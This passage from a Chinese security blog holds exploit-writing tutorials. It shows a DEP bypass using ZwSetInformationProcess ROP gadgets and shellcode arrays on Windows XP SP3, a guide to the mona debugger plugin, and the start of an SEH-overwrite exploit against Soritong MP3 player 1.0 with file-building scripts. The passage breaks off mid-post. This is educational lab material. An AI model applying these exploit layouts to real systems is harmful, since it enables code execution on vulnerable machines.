class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>7C\"//MOV EAX,1 RETN 地址</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>CD<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>7C\"//关闭DEP 代码的起始位置</div><div class=\"line\">;</div></pre></td></tr></table></figure></p>\n<p>重新编译程序后，用OllyDbg 重新加载程序，在0x7C93CD6F，即关闭DEP 后的RETN 4处下断点，然后让程序直接运行。但程序并没有像我们想象的那样在0x7C93CD6F 处中断，而是出现了异常。如图：</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ez62bo0l8bj30hs0az78n.jpg\" alt=\"\"></p>\n<p>程序现在需要对EBP-4 位置写入数据，但EBP 在溢出的时候被破坏了，目前EBP-4 的位置并不可以写入，所以程序出现了写入异常，所以我们现在的shellcode 布局是行不通的，在转入0x7C93CD24 前我们需要将EBP 指向一个可写的位置。</p>\n<p>我们可以通过类似PUSH ESP POP EBP RETN 的指令将EBP 定位到一个可写的位置，依然请出我们的OllyFindAddr 插件，我们可以在Disable DEP &lt;=XP SP3 搜索结果的Setp3 部分查看当前内存中所有符合条件的指令，如图:</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez62eexcwzj30gv05u0vp.jpg\" alt=\"\"></p>\n<p><font color=\"red\">Tips:</font> 第三步中的指令，可能刚加载程序时，为空，在程序运行到一定阶段，可能才有结果</p>\n<p>指令虽然找到了不少，但符合条件的不多。首先回顾一下图12.3.5 中各寄存器的状态，所有的寄存器中只有ESP 指向的位置可以写入，所以现在我们只能选择PUSH ESP POP EBP RETN 指令序列了。现在还有一个严重的问题需要解决，我们直接将ESP 的值赋给EBP 返回后，ESP 相对EBP 位于高址位置，当有入栈操作时EBP-4 处的值可能会被冲刷掉，进而影响传入ZwSetInformationProcess 的参数，造成DEP 关闭失败。</p>\n<p>我们不妨先使用0x5D1D8B85 处的PUSH ESP POP EBP RETN 04 指令来修正EBP，然后再根据堆栈情况想办法消除EBP-4 被冲刷的影响。先对shellcode 重新布局，在转入关闭DEP流程前加入修正EBP 指令，代码如下所示。<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">charshellcode[]=</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>D1<span class=\"symbol\">\\x</span>4F<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>0C\"</div><div class=\"line\">\"……\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>77<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>C4<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>50\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>7C\" //MOV EAX,1 RETN 地址</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>1D<span class=\"symbol\">\\x</span>5D\" //修正EBP</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>CD<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>7C\" //关闭DEP 代码的起始位置</div><div class=\"line\">;</div></pre></td></tr></table></figure></p>\n<p>重新编译程序后用OllyDbg 加载，在0x7C95683B 处，即CALL ZwSetInformationProcess时下断点，待程序中断后观察堆栈情况。<br>如图所示，EBP-4 中的内容已经被冲刷掉，内容已经被修改为0x22，根据_KEXECUTE_OPTIONS 结构我们知道DEP 只和结构中的前4 位有关，只要前4 位为二进制代码为0100 就可关闭DEP，而0x22（00100010）刚刚符合这个要求，所以用0x22 冲刷掉EBP-4 处的值还是可以关闭DEP 的。</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez62o2leynj30hq0ax78f.jpg\" alt=\"\"></p>\n<p>虽然现在我们已经关闭了DEP，但是我们失去了进程的控制权。</p>\n<p>一般来说当ESP 值小于EBP 时，防止入栈时破坏当前栈内内容的调整方法不外乎减小ESP和增大EBP，由于本次实验中我们的shellcode 位于内存低址，所以减小ESP 可能会破坏shellcode，而增大EBP 的指令在本次实验中竟然找不到。一个变通的方法是增大ESP 到一个安全的位置，让EBP 和ESP 之间的空间足够大，这样关闭DEP 过程中的压栈操作就不会冲刷到EBP 的范围内了。</p>\n<p>我们可以使用带有偏移量的RETN 指令来达到增大ESP 的目的，如RETN 0x28 等指令可以执行RETN指令后再将ESP 增加0x28 个字节。我们可以通过OllyFindAddr 插件中的Overflowreturn address-&gt; POP RETN+N 选项来查找相关指令，查找部分结果如图12.3.10 所示。</p>\n<p> <img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez63xe0c2jj30ff03etb6.jpg\" alt=\"\"></p>\n<p> 在搜索结果中选取指令时只有一个条件：不能对ESP 和EBP 有直接操作。否则我们会失去对程序的控制权。在这我们选择0x7C974A19 处的RETN 0x28 指令来增大ESP。我们对shellcode 重新布局，在关闭DEP 前加入增大ESP 指令地址。需要注意的是修正EBP 指令返回时带有的偏移量会影响后续指令，所以我们在布置shellcode 的时要加入相应的填充。<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">charshellcode[]=</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>D1<span class=\"symbol\">\\x</span>4F<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>0C\"</div><div class=\"line\">\"……\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>77<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>C4<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>50\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>7C\" //MOV EAX,1 RETN 地址</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>1D<span class=\"symbol\">\\x</span>5D\" //修正EBP</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>19<span class=\"symbol\">\\x</span>4A<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>7C\" //增大ESP</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\" //jmp esp</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>CD<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>7C\" //关闭DEP 代码的起始位置</div><div class=\"line\">;</div></pre></td></tr></table></figure></p>\n<p>我们依然在0x7C93CD6F 处中断程序，注意千万不要在程序刚加载完就在0x7C93CD6F 下断点， 不然您会被中断到崩溃。我们建议您先在0x7C95683B 处， 即CALL ZwSetInformationProcess 时下断点，然后F7，进入函数，单步运行到0x7C93CD6F，堆栈情况如图12.3.11 所示。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez642y1cszj30ho0b1n1c.jpg\" alt=\"\"></p>\n<p>可以看到，增大ESP 之后我们的关键数据都没有被破坏。执行完RETN 0x04 后ESP 将指向0x0012FEC4，所以我们只要在0x0012FE78 放置一条JMP ESP 指令就可让程序转入堆栈执行指令了。大家可以通过OllyFindAddr 插件中的Overflow return address→Find CALL/JMP ESP来搜索符合要求的指令，部分搜索结果如图12.3.12 所示。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez646fsd8tj30ex02djt4.jpg\" alt=\"\"></p>\n<p>本次实验我们选择0x7DC5C1B4 处的JMP ESP，然后我在0x0012FEC4 处放置一个长跳指令，让程序跳转到shellcode 的起始位置来执行shellcode，根据图12.3.11 中的内存状态，可以计算出0x0012FEC4 距离shellcode 起始位置有200 个字节，所以跳转指令需要回调205 个字节（200+5 字节跳转指令长度）。分析结束，我们开始布置shellcode，shellcode 布局如图12.3.13所示。</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ez64a6x9j5j30jb038t93.jpg\" alt=\"\"></p>\n<p>代码如下所示<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">charshellcode[]=</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>0A<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>1E<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>D1<span class=\"symbol\">\\x</span>4F<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>91<span class=\"symbol\">\\x</span>0C\"</div><div class=\"line\">\"……\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>77<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>66<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>6C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>C4<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>50\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>92<span class=\"symbol\">\\x</span>7C\" //MOV EAX,1 RETN 地址</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>85<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>1D<span class=\"symbol\">\\x</span>5D\" //修正EBP</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>19<span class=\"symbol\">\\x</span>4A<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>7C\" //增大ESP</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>B4<span class=\"symbol\">\\x</span>C1<span class=\"symbol\">\\x</span>C5<span class=\"symbol\">\\x</span>7D\" //jmp esp</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>CD<span class=\"symbol\">\\x</span>93<span class=\"symbol\">\\x</span>7C\" //关闭DEP 代码的起始位置</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>E9<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>FF\" //回跳指令</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div></pre></td></tr></table></figure></p>\n<p>按照图 12.3.13 中布局布置好shellcode 后将程序重新编译，用OllyDbg 加载程序，我们建议您在0x7C93CD6F 处下断点，待程序中断后，我们按F8 键单步运行程序，并注意各指令对堆栈及程序流程的影响，理解这种shellcode 的布置思路。执行完JMP ESP 后就可以看到程序转入shellcode，如图12.3.14 所示。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez648ldau6j30hq0b3djk.jpg\" alt=\"\"></p>\n<p>继续运行程序就可以看到熟悉的对话框，如图12.3.15 所示。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez615rdb3aj30ig0c1aao.jpg\" alt=\"\"></p>\n"},{"title":"Immunity Debugger 插件 mona 使用","url":"http://huirong.github.io/2015/12/18/mona/","content":"<p>本人最近写学shellcode编写，mona插件不可或缺，在此介绍mona插件用法<br><a id=\"more\"></a></p>\n<h1 id=\"Ⅰ、查找-pop-pop-ret\"><a href=\"#Ⅰ、查找-pop-pop-ret\" class=\"headerlink\" title=\"Ⅰ、查找 pop pop ret\"></a>Ⅰ、<font color=\"blue\">查找 pop pop ret</font></h1><p>用Immunity Debugger附加上待调试的程序，这样的地址更具有通用性，不依赖操作系统<br>在命令行输入<br><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"addition\">!mona rop</span></div></pre></td></tr></table></figure></p>\n<p>生成结果在 C:\\D\\mona-master\\output\\c ，log data中有显示</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ez422rhcvwj30ho05gt9v.jpg\" alt=\"\"></p>\n<p>以下是rop.txt中的内容</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ez424wnmi4j30vb048myt.jpg\" alt=\"\"></p>\n<h1 id=\"Ⅱ、查找JMP-ESP-CALL-ESP-push-esp-ret\"><a href=\"#Ⅱ、查找JMP-ESP-CALL-ESP-push-esp-ret\" class=\"headerlink\" title=\"Ⅱ、查找JMP ESP,CALL ESP, push esp;ret\"></a>Ⅱ、<font color=\"blue\">查找JMP ESP,CALL ESP, push esp;ret</font></h1><p>命令：</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">!mona <span class=\"keyword\">jmp</span> -r <span class=\"built_in\">esp</span></div></pre></td></tr></table></figure>\n<p>结果：</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez4293rxj5j30i70by782.jpg\" alt=\"\"></p>\n<h1 id=\"Ⅲ、计算SEH溢出长度\"><a href=\"#Ⅲ、计算SEH溢出长度\" class=\"headerlink\" title=\"Ⅲ、计算SEH溢出长度\"></a>Ⅲ、<font color=\"blue\">计算SEH溢出长度</font></h1><h2 id=\"①-生成溢出字符串\"><a href=\"#①-生成溢出字符串\" class=\"headerlink\" title=\"① 生成溢出字符串\"></a>① 生成溢出字符串</h2><p>命令：</p>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"addition\">!mona pattern_create 5000</span></div></pre></td></tr></table></figure>\n<p>5000为字符串长度<br>结果：</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1ez42ed5d1jj30k404ugne.jpg\" alt=\"\"></p>\n<p>使用该字符串尝试溢出，得到seh的值为:35744134</p>\n<h2 id=\"②-计算溢出长度\"><a href=\"#②-计算溢出长度\" class=\"headerlink\" title=\"② 计算溢出长度\"></a>② 计算溢出长度</h2><p>首先查找查找nseh偏移，命令<br><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"addition\">!mona pattern_offset 35744134</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1ez42k4ke5jj30ef04wwfs.jpg\" alt=\"\"><br>nseh的偏移为：584，则seh handler的偏移：584 + 4 =588</p>\n<h1 id=\"Ⅳ、汇编指令转机器码\"><a href=\"#Ⅳ、汇编指令转机器码\" class=\"headerlink\" title=\"Ⅳ、汇编指令转机器码\"></a>Ⅳ、<font color=\"blue\">汇编指令转机器码</font></h1><p>命令：<br><figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">!mona assemble/<span class=\"keyword\">asm</span> –s 汇编指令（多个指令用<span class=\"comment\">#分隔）</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ez42uxxyxfj30c303yjrw.jpg\" alt=\"\"></p>\n<h1 id=\"V、参考文献\"><a href=\"#V、参考文献\" class=\"headerlink\" title=\"V、参考文献\"></a>V、参考文献</h1><p><a href=\"http://www.hack80.com/thread-21042-1-1.html\" target=\"_blank\" rel=\"external\">Immunity Debugger-mona插件使用</a></p>\n"},{"title":"exploit编写教程2：跳转到shellcode","url":"http://huirong.github.io/2015/12/16/jmping-to-shellcode/","content":"<p>这个是基于SEH的exploit，SEH的原理大家去搜索，网上有很多资料，本文就不赘述了。<br><a id=\"more\"></a></p>\n<h1 id=\"I、试验环境\"><a href=\"#I、试验环境\" class=\"headerlink\" title=\"I、试验环境\"></a>I、试验环境</h1><ul>\n<li>测试平台： Microsoft Windows XP SP3</li>\n<li>漏洞软件：<a href=\"http://terenceli.github.io/assets/file/seh-exploit/soritong10.exe\" target=\"_blank\" rel=\"external\">Soritong MP3 player 1.0</a></li>\n<li>分析工具：Immunity Debugger</li>\n<li>漏洞描述：通过创建一个畸形皮肤文件将触发Soritong MP3 player 1.0溢出。</li>\n</ul>\n<h1 id=\"II、漏洞触发\"><a href=\"#II、漏洞触发\" class=\"headerlink\" title=\"II、漏洞触发\"></a>II、漏洞触发</h1><p>用python创建一个ui.txt文件并放到skin\\default文件夹下面<br><figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></div><div class=\"line\">filename = <span class=\"string\">\"ui.txt\"</span></div><div class=\"line\">junk = <span class=\"string\">'A'</span> * <span class=\"number\">5000</span></div><div class=\"line\">f = open(filename,<span class=\"string\">'w'</span>)</div><div class=\"line\">f.write(junk)</div><div class=\"line\">f.close()</div></pre></td></tr></table></figure></p>\n<p>打开Soritong，可以看到程序闪退。<br>使用Immunity Debugger加载Soritong，F9运行，然后查看SEH链（view -&gt; SEH chain），发现next SEH和SEH handler都被 A 覆盖了<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ez1aw1va0oj307f03pglt.jpg\" alt=\"\"></p>\n<p>当异常发生时，程序会跳转到SEH handler去执行，通过将这个handler的值设置为程序自带模块的一个pop/pop/ret地址，能够实现程序跳转到next seh pointer去，在next seh中需要做的就是跳转到shellcode执行。shellcode的布局大致如下：<br><figure class=\"highlight markdown\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">[<span class=\"string\">junk</span>][<span class=\"symbol\">next seh</span>][<span class=\"string\">seh</span>][<span class=\"symbol\">shellcode</span>]</div></pre></td></tr></table></figure></p>\n<p>next seh是一个跳转到shellcode的指令，seh是一个程序自带模块的p/p/r地址。<br>这里再解释一下pop pop ret指令的作用，当异常发生的时候，异常分发器创建自己的栈帧，会将EH handler成员压入新创的栈帧中，在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个函数被调用的时候被压入的这个值都是位于ESP+8的地方。使用pop pop ret后，就会将next seh的地址放到EIP中。</p>\n<h1 id=\"III、要精确定位-SEH-的偏移地址\"><a href=\"#III、要精确定位-SEH-的偏移地址\" class=\"headerlink\" title=\"III、要精确定位 SEH 的偏移地址\"></a>III、要精确定位 SEH 的偏移地址</h1><p>需要构造特殊的唯一字符串模型来覆盖缓冲区<br>Immunity Debugger再次加载Soritong，在命令行窗口输入：<br><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"addition\">!mona create_pattern 5000</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez1b8xtm4nj30k404ugne.jpg\" alt=\"\"></p>\n<p>从Log data中可知，pattern文件在C:\\D\\mona-master\\output\\Soritong\\pattern.txt，<br>提取出生成的5000个字符文件，放入p.txt，并替换ui.txt中的5000个字符。脚本如下：<br><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"keyword\">filename</span> = <span class=\"string\">\"ui.txt\"</span></div><div class=\"line\"></div><div class=\"line\">fp = <span class=\"keyword\">open</span>(<span class=\"string\">\"p.txt\"</span>,<span class=\"string\">'r'</span>)</div><div class=\"line\">junk = fp.<span class=\"keyword\">read</span>()</div><div class=\"line\"></div><div class=\"line\">f = <span class=\"keyword\">open</span>(<span class=\"keyword\">filename</span>,<span class=\"string\">'w'</span>)</div><div class=\"line\">f.write(junk)</div><div class=\"line\">f.<span class=\"keyword\">close</span>()</div></pre></td></tr></table></figure></p>\n<p>将生成的ui.txt覆盖skin\\default中的ui.txt<br>在Immunity Debugger中查看SEH chain：</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1ez1bo95bd0j307f02dmxd.jpg\" alt=\"\"></p>\n<p>nseh 的值为：35744134 ，在命令行输入<br><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"addition\">!mona pattern_offset 35744134</span></div></pre></td></tr></table></figure></p>\n<p>查找nseh偏移</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ez1bq0ehlzj30ef04wwfs.jpg\" alt=\"\"></p>\n<p>nseh的偏移为：584，则seh handler的偏移：584 + 4 =588</p>\n<p>此时我们再用如下脚本测试一下位置是否正确：<br><figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></div><div class=\"line\">filename = <span class=\"string\">\"ui.txt\"</span></div><div class=\"line\">junk = <span class=\"string\">'A'</span> * <span class=\"number\">584</span></div><div class=\"line\">nseh = <span class=\"string\">'B'</span> * <span class=\"number\">4</span></div><div class=\"line\">seh = <span class=\"string\">'C'</span> * <span class=\"number\">4</span></div><div class=\"line\">data = junk + nseh + seh</div><div class=\"line\">f = open(filename,<span class=\"string\">'w'</span>)</div><div class=\"line\">f.write(data)</div><div class=\"line\">f.close()</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ez1c47xmhvj307e032wep.jpg\" alt=\"\"></p>\n<h1 id=\"Ⅳ、查找-p-p-r-指令序列\"><a href=\"#Ⅳ、查找-p-p-r-指令序列\" class=\"headerlink\" title=\"Ⅳ、查找 p/p/r 指令序列\"></a>Ⅳ、查找 p/p/r 指令序列</h1><p>再次加载目标程序，在命令行窗口输入：<br><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"addition\">!mona rop</span></div></pre></td></tr></table></figure></p>\n<p>在rop.txt中查找合适的 p/p/r指令地址</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez1if82tnaj30el03njsl.jpg\" alt=\"\"></p>\n<p>选用 0x1001dd61 （选地址时，要注意shellcode截断）</p>\n<h1 id=\"V、构造最终的输入文件\"><a href=\"#V、构造最终的输入文件\" class=\"headerlink\" title=\"V、构造最终的输入文件\"></a>V、构造最终的输入文件</h1><p>一个short jmp机器码是eb，跟上跳转距离，跳过6字节的short jmp机器码为eb 06。所以使用0xeb,0x06,0x90,0x90覆盖 next seh。</p>\n<p>最终的shellcode就是</p>\n<p>junk:584字节 ‘A’</p>\n<p>next 